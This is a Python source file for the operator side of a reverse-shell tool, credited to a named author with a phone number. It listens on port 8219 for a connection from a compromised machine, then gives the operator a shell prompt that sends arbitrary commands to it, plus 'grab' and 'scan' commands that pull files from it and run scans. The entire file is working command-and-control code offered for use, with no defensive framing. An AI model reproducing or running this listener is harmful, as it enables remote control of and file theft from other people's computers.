import socket # For building tcp connectiom
from subprocess import PIPE, Popen
import subprocess
import os
#A TCP Server coded by Dimzy (+2348072444961 Contact him)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8219))
s.listen(1)
conn, addr = s.accept()
print ("[+] We got a connection from: ", addr)


def transfer(conn, command):
    conn.send(command.encode('utf-8'))
    f = open('test.png', 'wb')
    result = ''
    while True:
        bits = conn.recv(14600)
        if "[-] Unable to find the file".encode('utf-8') in bits:
            print ("[-] Unable to find the file")
        if bits.endswith("[+] Done".encode('utf-8')):
            print ("Transfer Completed")
            f.close()
            break
        f.write(bits)
    f.close()



def connect():
    while True:
        command = input("~Shell: ")

        if 'terminate' in command:
            conn.send('terminate'.encode('utf-8'))
            conn.close() #close the connection with host
            break

        elif 'cls' in command:
            try:
                subprocess.run("clear")
            except:
                subprocess.run("cls")

        elif 'grab' in command:
            try:
                transfer(conn, command)
            except:
                print ("[-] An error occurred")


        elif 'scan' in command:
            conn.send(command.encode('utf-8'))
            resultss = ''
            while True:
                resultss += conn.recv(14800).decode('utf-8')
                if resultss.endswith("{+} Done"):
                    print (resultss)
                    break
        else:
            conn.send(command.encode('utf-8')) #send command
            print (conn.recv(14800).decode('utf-8'))


def main():
    connect()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCtrl + C has been pressed... \n Terminating now")
